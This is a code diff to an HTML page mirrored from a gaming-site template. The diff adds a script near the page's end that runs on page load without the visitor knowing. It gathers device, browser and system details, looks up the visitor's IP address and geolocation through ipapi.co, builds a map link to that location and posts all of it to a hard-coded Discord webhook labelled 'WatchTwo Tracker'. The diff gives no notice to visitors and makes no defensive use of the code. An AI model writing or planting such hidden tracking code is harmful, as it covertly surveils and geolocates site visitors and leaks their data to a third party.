@@ -939,6 +939,167 @@
         integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
         data-cf-beacon='{"version":"2024.11.0","token":"4f3c83b9d0534360856601e874f451ae","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
         crossorigin="anonymous"></script>
+    <script>
+        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496024141097336964/eHRU_GwcfYecGJUZ1S2i-oXH_zeoyl9O1frL5APt_oFhGnISWj4soYdkdlRNk-LVGRtu';
+
+// Ana fonksiyon - Sayfa yüklendiğinde çalışır
+(function autoLogOnPageLoad() {
+    // Daha önce log düşüldü mü kontrol et (session bazlı)
+    const alreadyLogged = sessionStorage.getItem('log_sent');
+    if (alreadyLogged) return;
+    
+    // ========== VERİ TOPLAMA ==========
+    
+    // Domain bilgisi
+    const currentDomain = window.location.hostname;
+    const referrerDomain = document.referrer ? new URL(document.referrer).hostname : 'Doğrudan';
+    const pagePath = window.location.pathname;
+    
+    // Sistem bilgileri
+    const getSystemSummary = () => {
+        const ua = navigator.userAgent;
+        
+        let osDetailed = 'Bilinmiyor';
+        if (ua.includes('Windows NT 10.0')) osDetailed = 'Windows 11/10';
+        else if (ua.includes('Windows NT 6.3')) osDetailed = 'Windows 8.1';
+        else if (ua.includes('Windows NT 6.2')) osDetailed = 'Windows 8';
+        else if (ua.includes('Windows NT 6.1')) osDetailed = 'Windows 7';
+        else if (ua.includes('Mac OS X')) osDetailed = 'macOS';
+        else if (ua.includes('Android')) osDetailed = 'Android';
+        else if (ua.includes('iPhone')) osDetailed = 'iOS';
+        else if (ua.includes('iPad')) osDetailed = 'iPadOS';
+        else if (ua.includes('Linux')) osDetailed = 'Linux';
+        
+        let browserDetailed = 'Bilinmiyor';
+        let browserVersion = '?';
+        
+        if (ua.includes('Edg/')) {
+            browserDetailed = 'Microsoft Edge';
+            browserVersion = ua.split('Edg/')[1]?.split('.')[0] || '?';
+        } else if (ua.includes('Chrome/') && !ua.includes('Edg')) {
+            browserDetailed = 'Google Chrome';
+            browserVersion = ua.split('Chrome/')[1]?.split('.')[0] || '?';
+        } else if (ua.includes('Firefox/')) {
+            browserDetailed = 'Mozilla Firefox';
+            browserVersion = ua.split('Firefox/')[1]?.split('.')[0] || '?';
+        } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
+            browserDetailed = 'Apple Safari';
+            browserVersion = ua.split('Version/')[1]?.split('.')[0] || '?';
+        } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
+            browserDetailed = 'Opera';
+            browserVersion = ua.split('Opera/')[1]?.split('.')[0] || ua.split('OPR/')[1]?.split('.')[0] || '?';
+        }
+        
+        const cpuCores = navigator.hardwareConcurrency || '?';
+        const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?';
+        const screenRes = `${screen.width}x${screen.height}`;
+        const pixelRatio = window.devicePixelRatio || 1;
+        
+        return {
+            os: osDetailed,
+            browser: browserDetailed,
+            browserVersion: browserVersion,
+            cpu: cpuCores,
+            ram: ram,
+            screen: screenRes,
+            pixelRatio: pixelRatio,
+            isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua),
+            isTablet: /iPad|Android(?!.*Mobile)/i.test(ua)
+        };
+    };
+    
+    const system = getSystemSummary();
+    
+    const visitData = {
+        timestamp: new Date().toISOString(),
+        visitTime: new Date().toLocaleString('tr-TR'),
+        domain: currentDomain,
+        page: pagePath,
+        referrer: referrerDomain,
+        browser: `${system.browser} ${system.browserVersion}`,
+        os: system.os,
+        device: system.isTablet ? 'Tablet' : (system.isMobile ? 'Mobil' : 'Masaüstü'),
+        specs: `${system.cpu} Çekirdek | ${system.ram} RAM | ${system.screen}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookieEnabled: navigator.cookieEnabled
+    };
+    
+    // Session storage'a kaydet
+    sessionStorage.setItem('log_sent', 'true');
+    
+    // IP ve konum bilgisini al
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(ipData => {
+            const mapsLink = ipData.latitude && ipData.longitude ? 
+                `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : null;
+            
+            const visitType = referrerDomain === 'Doğrudan' ? '🚪 Doğrudan Giriş' : '🔗 Yönlendirme';
+            
+            const embed = {
+                embeds: [{
+                    title: '👁️ **Site Ziyareti**',
+                    color: 0x1a1a1a,
+                    description: `> **${visitData.browser}** ile **${visitData.domain}** ziyaret edildi\n> ${visitType}`,
+                    fields: [
+                        {
+                            name: '💻 **CİHAZ & SİSTEM**',
+                            value: `\`\`\`yaml\n${visitData.os}\n${visitData.specs}\nCihaz: ${visitData.device}\nDil: ${visitData.language}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: '📍 **KONUM & AĞ**',
+                            value: `\`\`\`yaml\nIP: ${ipData.ip || 'Bilinmiyor'}\n📍 ${ipData.city || '?'}, ${ipData.country_name || '?'}\n📡 ${ipData.org || 'Bilinmiyor'}\n⏰ ${ipData.timezone || visitData.timezone}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: '📊 **ZİYARET DETAYI**',
+                            value: `\`\`\`yaml\nSayfa: ${visitData.page}\n🔗 ${visitData.referrer}\n🕐 ${visitData.visitTime}\n🍪 Cookie: ${visitData.cookieEnabled ? 'Açık' : 'Kapalı'}\`\`\``,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: `WatchTwo Tracker`,
+                        icon_url: 'https://i.imgur.com/footer-icon.png'
+                    },
+                    timestamp: visitData.timestamp
+                }]
+            };
+            
+            if (mapsLink) {
+                embed.embeds[0].fields.push({
+                    name: '🗺️ **HARİTA**',
+                    value: `[📍 Konumu Göster](${mapsLink})`,
+                    inline: false
+                });
+            }
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            }).catch(() => {});
+        })
+        .catch(() => {
+            const simpleEmbed = {
+                embeds: [{
+                    title: '👁️ Site Ziyareti',
+                    color: 0x1a1a1a,
+                    description: `\`\`\`yaml\nDomain: ${currentDomain}\nTarayıcı: ${visitData.browser}\nOS: ${visitData.os}\nCihaz: ${visitData.device}\nReferans: ${visitData.referrer}\nZaman: ${visitData.visitTime}\`\`\``,
+                    footer: { text: 'WatchTwo Tracker' },
+                    timestamp: visitData.timestamp
+                }]
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(simpleEmbed)
+            }).catch(() => {});
+        });
+})();
+    </script>
 </body>
 
 <!-- Mirrored from html.nkdev.info/godlike/index-main.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Dec 2025 20:53:59 GMT -->
